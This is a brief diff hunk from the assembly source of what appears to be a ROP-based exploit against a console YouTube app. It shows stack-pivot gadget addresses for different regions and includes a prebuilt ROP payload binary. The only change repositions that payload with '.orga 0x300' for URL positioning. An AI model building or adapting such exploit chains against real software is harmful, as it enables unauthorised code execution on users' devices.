@@ -77,7 +77,7 @@ PAYLOAD_LOC equ PAYLOAD_PRIM_LOC
 		.word PAYLOAD_LOC + second_stack_pivot_data ; r10 (stack pivot data ptr)
 	.word YTB_STACK_PIVOT2 ; ldm r10!, {r4, r5, r9, r12, sp, lr, pc} (WEST) or ldm r8!, {r8, ip, sp, lr, pc} (JPN)
 
-	.align 0x4
+	.orga 0x300 ; important for URL absolute positioning
 	payload_secondary:
 		.incbin "../build/ytb_rop.bin"
 	payload_secondary_end:
